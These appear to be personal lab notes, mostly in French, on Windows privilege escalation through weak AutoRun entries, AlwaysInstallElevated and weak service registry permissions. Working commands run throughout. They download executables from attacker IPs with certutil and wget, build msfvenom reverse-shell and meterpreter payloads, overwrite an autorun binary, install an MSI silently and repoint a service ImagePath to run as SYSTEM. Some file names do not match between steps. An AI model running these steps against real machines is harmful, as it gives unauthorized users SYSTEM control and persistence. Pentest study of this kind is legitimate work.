This is my learning about windows Privilege Escalation
## Weak Registry Autoruns Escalation
Windows peut être configuré pour exécuter des commandes au démarrage, ce processus est appelé AutoRun. Ces exécutions automatiques sont configurées dans le registre. Si vous êtes en mesure d'écrire dans un exécutable AutoRun et de redémarrer le système (ou d'attendre qu'il soit redémarré), vous pouvez être en mesure d'élever vos privilèges.

Pour cela utilisons winpeas pour voir s'il ya des programmes qui ont un droit de autorun
```
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
.\winPEASany.exe quiet applicationsinfo
```
trouver un program d'autorun  qui es le program.exe dans `C:\Program Files\Autorun Program\program.exe`

Si nous souhaitons effectuer l'énumération manuellement, il suffit d'utiliser la commande ci-dessous :
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
Pour vérifier la permission du programme.exe, nous utiliserons accesschk.exe.

```
.\accesschk.exe /accepteula -wvu "Program path"
```
Maintenant pour l'exploiter on doit creer un program avec le meme nom que program.exe avec notre listner
```
msfvenom -p windows/shell_reverse_tcp lhost=10.4.5.83 lport=53 -f exe > shell.exe
```
copy it to program.exe
```
copy /Y shell.exe "C:\Program Files\Autorun Program\program.exe"
```

## AlwaysInstallElevated
 Dans les tests de pénétration, lorsque nous lançons un shell de commande en tant qu'utilisateur local, il est possible d'exploiter les fonctions vulnérables (ou les paramètres de configuration) de la stratégie de groupe de Windows, afin de les élever aux privilèges d'administrateur et d'obtenir l'accès d'administrateur.
 Comme nous le savons tous, le système d'exploitation Windows est doté d'un moteur Windows Installer qui est utilisé par les paquets MSI pour l'installation d'applications. Ces paquets MSI peuvent être installés avec des privilèges élevés pour les utilisateurs non administrateurs.
**Detection**
Pour detecter cela il suffit
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Comme nous pouvons le voir dans la sortie, le registre nommé "AlwaysInstallElevated" existe avec une valeur dword (REG_WORD) de 0x1, ce qui signifie que la stratégie AlwaysInstallElevated est activée.

- Privilege Escalation via .msi payload 
La premiere methode est de creer un payload en `.msi` ensuite l'executer avec `msiexec /quiet /qn /i`
/quiet = Supprime tout message à l'utilisateur pendant l'installation
/qn = Pas d'interface graphique
/i = Installation normale (vs. administrative)
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 -f msi > shell.msi

msiexec /quiet /qn /i shell.msi
```




## Weak registry escalation
Microsoft Windows offre un large éventail d'autorisations et de privilèges très précis pour contrôler l'accès aux composants de Windows, notamment les services, les fichiers et les entrées de registre. L'exploitation des permissions faibles du registre est une technique permettant d'augmenter les privilèges.

En détournant les entrées du registre utilisées par les services, les attaquants peuvent exécuter leurs charges utiles malveillantes. Les attaquants peuvent utiliser les faiblesses des autorisations du registre pour détourner l'exécutable initialement prévu vers un exécutable qu'ils contrôlent au démarrage du service, ce qui leur permet d'exécuter leurs logiciels malveillants non autorisés.
**Windows Registry**
Le registre est une base de données définie par le système dans laquelle les applications et les composants du système stockent et récupèrent des données de configuration. Le registre est une base de données hiérarchique qui contient des données essentielles au fonctionnement de Windows et des applications et services qui s'exécutent sur Windows.

Un attaquant peut élever ses privilèges en exploitant une permission faible du Registre si l'utilisateur actuel a la permission de modifier les clés du Registre associées au service.

- Après une première prise de contact, nous pouvons demander les permissions des clés de registre du service à l'aide de l'outil Sysinternals `accesschk.exe`
```
C:\Users\vboxuser\AppData\Local\Temp>accesschk.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services
Sysinternals - www.sysinternals.com

 W HKLM\System\CurrentControlSet\services\BTAGService\Parameters\Settings
	KEY_CREATE_SUB_KEY
	KEY_SET_VALUE
	READ_CONTROL
RW HKLM\System\CurrentControlSet\services\embeddedmode\Parameters
	KEY_QUERY_VALUE
	KEY_CREATE_SUB_KEY
	KEY_ENUMERATE_SUB_KEYS
	KEY_NOTIFY
	READ_CONTROL
RW HKLM\System\CurrentControlSet\services\pentest
	KEY_ALL_ACCESS
RW HKLM\System\CurrentControlSet\services\vds\Alignment
	KEY_QUERY_VALUE
	KEY_CREATE_SUB_KEY
	KEY_ENUMERATE_SUB_KEYS
	READ_CONTROL
```
je trouve dans ma detection que le `RW HKLM\System\CurrentControlSet\services\pentest` est `	KEY_ALL_ACCESS` un access complet
je vais faire du `reg query` sur ce registre `HKLM\System\CurrentControlSet\services\pentest` la pour plus d'infos
```
C:\Users\vboxuser\AppData\Local\Temp>reg query hklm\System\CurrentControlSet\services\pentest
reg query hklm\System\CurrentControlSet\services\pentest

HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pentest
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    C:\temp\service.exe
    ObjectName    REG_SZ    LocalSystem

HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pentest\Security

C:\Users\vboxuser\AppData\Local\Temp>

```
Voici le program vulnerable qui est juste le `C:\temp\service.exe`
Pour l'exploiter:
- Create Malicious Executable 
Créer un shell exécutable et l'installer sur la machine de la victime, puis modifier la clé de registre du service en un exécutable puisque l'utilisateur authentifié a un accès complet au service et a donc la possibilité de modifier le chemin d'accès à l'image du service.

```
C:\Users\vboxuser\AppData\Local\Temp>powershell wget http://192.168.56.1/shell2.exe -o s2.exe

reg add "HKLM\system\currentcontrolset\services\pentest" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Public\shell.exe" /f
```
Then 
```
net start pentest
```
Lorsque le service démarre ou est redémarré, le programme contrôlé par l'adversaire s'exécute, ce qui permet à ce dernier d'obtenir la persistance et/ou l'escalade des privilèges dans le contexte du compte sous lequel le service est censé s'exécuter (compte local/domaine, SYSTEM, LocalService ou NetworkService).